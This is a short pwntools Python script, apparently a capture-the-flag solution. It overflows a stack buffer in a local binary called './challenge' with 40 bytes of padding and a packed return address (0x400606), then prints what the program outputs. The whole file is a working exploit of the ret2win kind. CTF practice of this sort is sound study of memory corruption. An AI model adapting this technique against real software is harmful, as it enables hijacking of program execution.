#!/usr/bin/env python3

from pwn import *

import sys

payload = b'a' * 40 + p64(0x400606)

p = process("./challenge")

p.sendline(payload)

print(p.recvall().decode(), end='')
